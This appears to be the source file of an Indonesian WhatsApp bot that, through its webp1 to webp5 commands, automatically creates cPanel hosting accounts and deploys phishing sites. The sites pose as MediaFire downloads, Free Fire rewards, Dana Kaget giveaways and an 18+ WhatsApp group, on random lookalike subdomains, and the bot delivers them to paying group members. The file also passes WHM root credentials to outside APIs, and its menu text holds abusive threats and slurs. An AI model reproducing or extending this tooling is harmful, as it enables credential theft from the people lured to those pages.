const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { getGroupAdmins,updateDatabase } = require('./lib/functions.js')
const { exec } = require('child_process')
const fs = require('fs')
const request = require("request")
module.exports = async (semar, denz, msg) => {
try {
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const isGroup = from.endsWith('@g.us')
const botNumber = semar.user.id.split(':')[0]
const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await semar.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isOwner = nomorOwner.includes(senderNumber) || isSaya
const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
const validGrup=(id,array)=>{for(var i=0;i<array.length;i++){if(array[i]==id){return!0}}
return!1}
0
// kirimprib(hasillrndy
const kirimprib =async(text,id) => { await semar.sendMessage(id,{text: text},{quoted:msg}) }
//ALL DATABASE
server = JSON.parse(fs.readFileSync('./database/server.json'))
grups = JSON.parse(fs.readFileSync('./database/grups.json'))
switch (command) {

    // 2 OKTOBER 2022
    // FITUR HOST BY RNDYBOTZ

    case 'menu' :
     id = msg.key.remoteJid
        if(validGrup(id,grups)){

        menu =`*HAII DEK! SAYA ADALAH BOT WEB YANG DI BUAT OLEH DIMAS YANG DI RANCANG AGAR TIDAK TOXIC DAN RAJIN,KALAU PAKE BOT JANGAN SPAM YA ANJING BABI KONTOL BAPAK MU LONTE YANG SPAM DELAY GUA PEPEK*

*_Owner Ganteng : Dimas_*
*_No Owner Ganteng :_*
1. wa.me/6283179639829
2. wa.me/6283827004253
*JOIN GRUB JASTEB GG DEK :*
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
*GA JOIN? GW BANTAI BAPAK LO!*

NOTE :
• SEWA BOT PERMANEN 30K -3 Slot
• SEWA BOT 1 Bulan 20K UNL Slot
MINAT? CHAT WA OWNER
GA MINAT? GUA BUG LU KTL

*Bot Dimas Di Buat Dengan Persilangan Hubungan Gelap Bersama Lonte Limapuluh Di Jamin Aktif 24 Jam*

*Domain Akan Selalu Ganti Setiap Hari*

*MAU LIAT MENUWEB? GAUSAH KEPO DEH KONTOL SEMUA SEMUA MAU! KETIK .menuweb UNTUK MELIHAT MENUWEB*`
reply(menu)
        }else{
            reply("Lu siapa apa bangsat!")
        }
        break
      
        case 'update':
        if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
        
            if(args == ""){
            psn = `SILAHKAN DI SIMAK
jika ingin update url server ketik *${prefix}${command}* url | xnxx.com
             
jika ingin update username server ketik *${prefix}${command}* username | rndytech
             
jika ingin update password server ketik *${prefix}${command}* password | @@##rndytech##@@
             
jika ingin update ipaddress server ketik *${prefix}${command}* ip | 1.1.1.1

jika ingin update domain server ketik *${prefix}${command}* domain | randiramli.com
             
jika ingin tambah grup ketik *${prefix}${command}* grup | 120363044180328540@g.us
            `
            reply(psn)
            }else{
                
                jenis = args[0]
                isi = args[2]
            
            update= updateDatabase(jenis,isi)
            if(update == "success"){
            server = JSON.parse(fs.readFileSync('./database/server.json'))
            grups = JSON.parse(fs.readFileSync('./database/grups.json'))
            
                info = `INFO SETINGAN BOT HOST
            

-- DATABASE BOT --
Server = ${server[0].url}
Username = ${server[0].username}
Password = ${server[0].password}
Ip address = ${server[0].ip}
Domain = ${server[0].domain}

            `
            reply(info)
                }
                
            }
            
            break
            
            case 'infobot' :
            if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
            id = msg.key.remoteJid
        
            info = `INFO SETINGAN BOT HOST
            
-- DATABASE BOT --
Server = ${server[0].url}
Username = ${server[0].username}
Password = ${server[0].password}
Ip address = ${server[0].ip}
Domain = ${server[0].domain}
            
            `
            reply(info);
            
            break
            
        case 'listgrup':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
        let text = "LIST BEBAN:\n\n"
            for (let i = 0; i < grups.length; i++) {
                text += "> "+ grups[i] + "\n";
            }
            reply(text)
            
            
            break    
            case 'cekidgrup':
            reply('ID Sudah Ku Kirim Boss😉')
                id = msg.key.remoteJid
                pengirim = msg.key.participant
                nama = msg.pushName
          

    await semar.sendMessage(pengirim,{text: `HALO ${nama} \n\n ${id} \n\n`},{quoted:msg})

            break 

//CASE HOST
case 'create' :
    reply("sedang membuat...")
    if(args != ""){
    parse = dn.split(" | ")
        user = parse[0]
        pass = parse[1]
        pkg = parse[2]
        
host = server[0].url
uroot = server[0].username
proot = server[0].password
domain = user +".login"
var inputt = {
    
                  server: host,
              uroot: uroot,
              proot: proot,
                 user: user,
              pass: pass,
              domain: domain,
              pkg: pkg,
          }
          
          request.post({
              url: 'https://randiramli.com/api/hosting/create.php',
              form: inputt
            }, function(error, response, body){
    reply(body)
    })
    
    // console.log(parse)
}
        break

case 'ceksmtp' :
    host = server[0].url
    uroot = server[0].username
    proot = server[0].password
    var inputt = {
        
        server: host,
        uroot: uroot,
              proot: proot,
          }
          
          request.post({
              url: 'https://yogax.my.id/smtp.php',
              form: inputt
            }, function(error, response, body){
reply(body)
})
 
        break

case 'cekdefault' :
 
    host = server[0].url
    uroot = server[0].username
    proot = server[0].password
 var inputt = {
     
              server: host,
              uroot: uroot,
              proot: proot,
            }
 
          request.post({
              url: 'https://randiramli.com/api/hosting/cekdefault.php',
              form: inputt
            }, function(error, response, body){
reply(body)
})
        break
        case 'termint' :
            if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
            user = args[0]
            host = server[0].url
            uroot = server[0].username
proot = server[0].password
var inputt = {
    
              server: host,
              uroot: uroot,
              proot: proot,
              user: user,
            }
            
          request.post({
              url: 'https://randiramli.com/api/hosting/termint.php',
              form: inputt
            }, function(error, response, body){
                reply(body)
            })
            
            break
            case 'addpack' :
                if(args != ""){
                parse = dn.split(" | ")
                    user = parse[0]
                    pkg = parse[1]
 host = server[0].url
 uroot = server[0].username
 proot = server[0].password
 var inputt = {

     server: host,
              uroot: uroot,
              proot: proot,
              user: user,
              pkg: pkg,
          }
 
          request.post({
              url: 'https://randiramli.com/api/hosting/addpack.php',
              form: inputt
            }, function(error, response, body){
reply(body)
})
}else{
    reply("masukin parameter bang!")
}
        break
//CASE HOST


case 'menuweb' :
    menuweb = `══════[ 𝙈𝙀𝙉𝙐 ]══════⊱

*GRUB JASTEB GG:*
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
*Script Bot Webp*
https://youtu.be/PwkvawxjaSU
|════════════════════⊱
| *STATUS BOT : AKTIF✅*
| *PERBAIKAN : ⚙*
|════════════════════⊱
|メ${prefix}webp1: MediaFire MP4 
|メ${prefix}webp2: MediaFire ZIP
|メ${prefix}webp3: FF Claim 
|メ${prefix}webp4: Dana Kaget 
|メ${prefix}webp5: Grup Wa 18+ 
|═══════[ DIMAS ]══════⊱
| Ketik: ${prefix}webp1
| Untuk web MediaFire MP4
 ════════════════⊱`
reply(menuweb)
break


                  case 'webp1' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mediafire" + makeid(7) + "." + server[0].domain


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*Antri Dek...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apidimas.noxzyxd.xyz/yos/media/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("Proses...")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "yosoka",
                    path: pathh,
                }

                request.post({
                    url: 'https://apidimas.noxzyxd.xyz/yos/media/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply(`*_BERHASIL!_* Web Sudah Terkirim Kepada ${namamu}`) // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`*_BERHASIL!_* Web Sudah Terkirim Kepada ${namamu}`, idmu)
                    }


                    hasillrndy = `- Web MediaFire MP4\n==========================\nWebsite : ${pendek}\nWeb Setting : ${domain}/vhsfhqpdhdsih6/setting.php\n==========================
*Grub Jasteb GG*
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("ini grup siapa?")
    }
break

case 'webp2' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mediafire2" + makeid(7) + "." + server[0].domain


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*Antri Dek...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apidimas.noxzyxd.xyz/yos/media/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("*Proses...*")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "yosoka",
                    path: pathh,
                }

                request.post({
                    url: 'https://apidimas.noxzyxd.xyz/yos/media/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply(`*_BERHASIL!_* Web Sudah Terkirim Kepada ${namamu}`, idmu) // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`*_BERHASIL!_* Web Sudah Terkirim Kepada ${namamu}`, idmu)
                    }


                    hasillrndy = `- Web MediaFire ZIP\n==========================\nWebsite : ${pendek}\nWeb Setting : ${domain}/vhsfhqpdhdsih6/setting.php\n==========================
*Grub Jasteb GG*
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    reply(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
	reply("ini grup siapa bangsat")
	}
break

case 'webp3' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "freefire" + makeid(7) + "." + server[0].domain


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*Antri Dek...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apidimas.noxzyxd.xyz/yos/freefire2/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("*Proses...*")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "simontok",
                    path: pathh,
                }

                request.post({
                    url: 'https://apidimas.noxzyxd.xyz/yos/frefire2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply(`*_BERHASIL!_* Web Sudah Terkirim Kepada ${namamu}`, idmu) // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`*_BERHASIL!_* Web Sudah Terkirim Kepada ${namamu}`, idmu)
                    }


                    hasillrndy = `- WEB FF Spin\n==========================\nWebsite : ${pendek}\nWeb Setting : ${domain}/vhsfhqpdhdsih6/kenangan30.php\n==========================
*Grub Jasteb GG*
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
break

case 'webp4' :

id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mobile-legend" + makeid(7) + "." + server[0].domain


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*Antri Dek...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({           url: 'https://apidimas.noxzyxd.xyz/yos/daget/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("*Proses...*")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apidimas.noxzyxd.xyz/yos/daget/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply(`*_BERHASIL!_* Web Sudah Terkirim Kepada ${namamu}`, idmu) // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`*_BERHASIL!_* Web Sudah Terkirim Kepada ${namamu}`, idmu)
                    }


                    hasillrndy = `- WEB Dana Kaget\n==========================\nWebsite : ${pendek}\nWeb Setting : ${domain}/vhsfhqpdhdsih6/settingrose.php\n==========================
*Grub Jasteb GG*
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
break

case 'webp5' :
id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "grupwa" + makeid(7) + "." + server[0].domain


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*Antri Dek...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apidimas.noxzyxd.xyz/yos/simontok/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                reply("*Proses...*")
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "groupwa1",
                    path: pathh,
                }

                request.post({
                    url: 'https://apidimas.noxzyxd.xyz/yos/simontok/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply(`*_BERHASIL!_* Web Sudah Terkirim Kepada ${namamu}`, idmu) // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`*_BERHASIL!_* Web Sudah Terkirim Kepada ${namamu}`, idmu)
                    }


                    hasillrndy = `- WEB Grub WA 18+\n==========================\nWebsite : ${pendek}\nWeb Setting : ${domain}/vhsfhqpdhdsih6/setting.php\n==========================
*Grub Jasteb GG*
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf\n_Tunggu 1-2 Menit Agar webnya siap digunakan_`


                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("ini grup apa bangsat!")
        }
break

case 'grup':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (args.length < 1) return reply("silahkan pilih grup open/close")
if (args[0] === 'open'){ await semar.groupSettingUpdate(from, 'not_announcement')
} else if (args[0] === 'close'){ await semar.groupSettingUpdate(from, 'announcement')} else { reply('yang bener lah pantek')}
break

case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
remove = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [remove], "remove")
break

case 'promote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [promote], "promote")
reply('Done!')
break

case 'demote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [demote], "demote")
reply('Done!')
break

case 'leave':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
await semar.groupLeave(from)
break

case 'delete': case 'd': case 'del':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
break

case 'restart':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 restart index`, (error, stdout, stderr) => {
    reply("BERHASIL RESTART ULANG")
    reply(stdout)
})
break

case 'shutdown':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
break
default:
}} catch (e) {
console.log(e)
}
}